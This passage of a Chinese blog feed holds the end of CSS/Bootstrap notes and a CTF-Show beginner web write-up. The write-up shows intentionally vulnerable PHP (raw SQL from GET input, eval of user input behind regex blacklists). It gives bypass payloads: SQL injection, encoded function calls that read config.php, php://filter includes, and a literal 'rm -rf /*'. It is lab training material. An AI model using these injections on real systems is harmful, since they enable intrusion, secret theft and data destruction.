text-overflow:ellipsis;  常用的搭配</span><br><span class="line"></span><br><span class="line">text-align: left center right  位置</span><br><span class="line">text-decoration: none underline line-through贯穿线</span><br><span class="line">text-shadow:1px 1px rgba(0,0,0,0.3)  阴影</span><br><span class="line">letter-spacing:  文字或字母间距</span><br><span class="line">line-height:  行高</span><br><span class="line">color:   颜色</span><br></pre></td></tr></table></figure><p><strong>边框属性：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">border: 宽度 样式 颜色</span><br><span class="line">border-color:</span><br><span class="line">border-style:</span><br><span class="line">border-width:</span><br><span class="line">border-left-color:</span><br><span class="line">border-left-style:</span><br><span class="line">border-left-width:</span><br><span class="line"></span><br><span class="line">border-radius:  圆角处理</span><br><span class="line">box-shadow:  设置或检索对象阴影</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/14/ExTY2ZRQ3wvcHgN.png" alt="image-20211114142429453"></p><p>补充：css 响应式布局</p><h2 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="Bootstrap"></a>Bootstrap</h2><p>最受欢迎的 css js html框架，用于开发响应式布局</p><p>bootstrap 差钱全部依赖 JQuery</p><p> 下载：<a href="https://v3.bootcss.com/">https://v3.bootcss.com/</a></p><p>Jquery 下载：<a href="https://jquery.com/">https://jquery.com/</a></p><p><img src="https://i.loli.net/2021/11/14/LHfTpVm3bh7r6dv.png" alt="image-20211114145951756"></p><p>一定要导入以上三个文件</p><p>然后在 class 里面改指定的名称即可</p><p><img src="https://i.loli.net/2021/11/14/nUrMakF2jXVN71C.png" alt="image-20211114150231172"></p><p> 能够看到 bootstrap 在之前的基础上有默认添加了一些样式用于美化</p><p>可以在官网看具体用法：<a href="https://v3.bootcss.com/css/">https://v3.bootcss.com/css/</a></p><p><img src="https://i.loli.net/2021/11/14/1Na7qJsE3b6Q5lA.png" alt="image-20211114153722056"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="HTML" scheme="https://xizhi-future.github.io/categories/HTML/"/>
    
    
    <category term="HTML" scheme="https://xizhi-future.github.io/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Show-萌新计划</title>
    <link href="https://xizhi-future.github.io/2021/11/19/CTF-Show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92/"/>
    <id>https://xizhi-future.github.io/2021/11/19/CTF-Show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92/</id>
    <published>2021-11-19T07:17:08.000Z</published>
    <updated>2021-11-19T07:17:55.004Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="CTF-Show-—-萌新计划"><a href="#CTF-Show-—-萌新计划" class="headerlink" title="CTF Show — 萌新计划"></a>CTF Show — 萌新计划</h1><p>Web 1-7</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//<span class="built_in">echo</span> intval(<span class="string">&#x27;1000&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(intval(<span class="variable">$a</span>) &gt; 999 )&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进制转换</span></span><br><span class="line">0x38e<span class="comment">#十六进制</span></span><br><span class="line">0b1111101000<span class="comment"># 二进制</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 取反 异或 与运算</span></span><br><span class="line">~~1000</span><br><span class="line">200^800</span><br><span class="line">992|8</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运算符</span></span><br><span class="line">200*5</span><br><span class="line">10/0.01</span><br><span class="line">--1000</span><br><span class="line">200%2b800</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sql 注入</span></span><br><span class="line">?id=1 or 1=1</span><br><span class="line">id=id<span class="comment">#</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=(1000)</span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web 1"></a>Web 1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># 包含数据库连接文件</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="comment"># 判断get提交的参数id是否存在</span></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="comment"># 判断id的值是否大于999</span></span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$id</span>) &gt; 999)&#123;</span><br><span class="line">        <span class="comment"># id 大于 999 直接退出并返回错误</span></span><br><span class="line">        die(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment"># id 小于 999 拼接sql语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="variable">$id</span> order by id limit 1 &quot;</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;执行的sql为：<span class="variable">$sql</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="comment"># 执行sql 语句</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="comment"># 判断有没有查询结果</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            <span class="comment"># 如果有结果，获取结果对象的值$row</span></span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc()) &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;id: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - title: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;title&quot;</span>]. <span class="string">&quot; &lt;br&gt;&lt;hr&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 关闭数据库连接</span></span><br><span class="line">        <span class="variable">$conn</span>-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag <span class="keyword">in</span> id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>需要满足 intval($id) &lt;= 999 , 但又要 id = 1000</p><p>测试</p><p><img src="https://i.loli.net/2021/08/16/au6swWVp8t4bKm5.png" alt="image-20210816155514366"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/14/sLFV7bO5RuzCmXH.png" alt="image-20210814231236552"></p><p><strong>其它绕过方式：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=0x3e8  <span class="comment"># 数据库中查询可使用 十六进制</span></span><br><span class="line">select * from article <span class="built_in">where</span> id = 0x3e8 order by id <span class="built_in">limit</span> 1</span><br><span class="line"></span><br><span class="line">?id=125&lt;&lt;<span class="string">3# 不知</span></span><br><span class="line"><span class="string">?id=680|320# 不知</span></span><br></pre></td></tr></table></figure><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web 2"></a>Web 2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web 3"></a>Web 3</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Web-4"><a href="#Web-4" class="headerlink" title="Web 4"></a>Web 4</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Web-5"><a href="#Web-5" class="headerlink" title="Web 5"></a>Web 5</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))</span><br></pre></td></tr></table></figure><p>过滤引号</p><p><strong>取反绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=~~1000</span><br></pre></td></tr></table></figure><p><strong>异或绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0^0 = 0</span><br><span class="line">1^0 = 1</span><br><span class="line">0^1 = 1</span><br><span class="line">1^1 = 0</span><br><span class="line">即同为假，异为真</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=</span><br></pre></td></tr></table></figure><p><strong>二进制绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0b1111101000<span class="comment"># 0b 开头表示二进制</span></span><br></pre></td></tr></table></figure><h2 id="Web-6"><a href="#Web-6" class="headerlink" title="Web 6"></a>Web 6</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0b1111101000<span class="comment"># 0b 开头表示二进制</span></span><br></pre></td></tr></table></figure><h2 id="Web-7"><a href="#Web-7" class="headerlink" title="Web 7"></a>Web 7</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0b1111101000<span class="comment"># 0b 开头表示二进制</span></span><br></pre></td></tr></table></figure><h2 id="Web-8-—-flag-rm-rf"><a href="#Web-8-—-flag-rm-rf" class="headerlink" title="Web 8 — ?flag=rm -rf /*"></a>Web 8 — ?flag=rm -rf /*</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># 包含数据库连接文件,key flag 也在里面定义</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="comment"># 判断get提交的参数id是否存在</span></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="variable">$f</span>)&#123;</span><br><span class="line">                        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=rm -rf /*</span><br></pre></td></tr></table></figure><h2 id="Web-9"><a href="#Web-9" class="headerlink" title="Web 9"></a>Web 9</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=highlight_file(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">?c=system(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web-10"><a href="#Web-10" class="headerlink" title="Web 10"></a>Web 10</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">?c=<span class="variable">$a</span>=<span class="string">&#x27;sys&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;tem&#x27;</span>;<span class="variable">$d</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$d</span>(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br><span class="line">?c=passthru(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web-11"><a href="#Web-11" class="headerlink" title="Web 11"></a>Web 11</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">?c=<span class="variable">$a</span>=<span class="string">&#x27;sys&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;tem&#x27;</span>;<span class="variable">$d</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$d</span>(<span class="string">&#x27;tac config.php&#x27;</span>);</span><br><span class="line">?c=passthru(<span class="string">&#x27;tac config.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web-12"><a href="#Web-12" class="headerlink" title="Web 12"></a>Web 12</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(<span class="string">&#x27;tac confi*&#x27;</span>);</span><br><span class="line">?c=passthru(<span class="string">&#x27;tac con&quot;&quot;fig*&#x27;</span>);</span><br><span class="line">?c=passthru(<span class="string">&#x27;tac con\fig*&#x27;</span>);</span><br><span class="line">?c=<span class="variable">$a</span>=base64_decode(<span class="string">&quot;c3lzdGVt&quot;</span>);<span class="variable">$b</span>=base64_decode(<span class="string">&quot;Y2F0IGNvbmZpZy5waHA=&quot;</span>);<span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">#system(&#x27;cat config.php&#x27;);</span></span><br></pre></td></tr></table></figure><h2 id="Web-13-—-过滤-；"><a href="#Web-13-—-过滤-；" class="headerlink" title="Web 13 — 过滤 ；"></a>Web 13 — 过滤 ；</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>过滤了 分号 ;</strong>    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># include + 伪协议</span></span><br><span class="line">?c=include<span class="variable">$_GET</span>[1]?&gt;&amp;1=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=config.php</span><br><span class="line"><span class="comment"># ?&gt; 闭合</span></span><br><span class="line">?c=passthru(<span class="string">&#x27;tac con\fig*&#x27;</span>)?&gt;</span><br></pre></td></tr></table></figure><h2 id="Web-14"><a href="#Web-14" class="headerlink" title="Web 14"></a>Web 14</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight 